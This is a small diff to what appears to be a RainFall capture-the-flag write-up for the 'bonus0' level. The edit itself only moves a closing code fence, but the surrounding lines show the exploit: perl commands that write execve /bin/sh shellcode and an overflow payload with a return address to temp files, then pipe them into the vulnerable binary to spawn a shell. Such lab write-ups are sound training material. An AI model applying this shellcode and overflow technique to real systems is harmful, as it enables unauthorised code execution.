@@ -73,7 +73,8 @@ start address                                                                   
 ```sh
 echo $( perl -e 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";') > /tmp/first
 
-echo $(perl -e 'print  "A"x9 . "\x80\xe6\xff\xbf" . "A"x7;') > /tmp/second```
+echo $(perl -e 'print  "A"x9 . "\x80\xe6\xff\xbf" . "A"x7;') > /tmp/second
+```
 
 ```sh
 bonus0@RainFall:~$ cat /tmp/second - | cat /tmp/first - | ./bonus0 
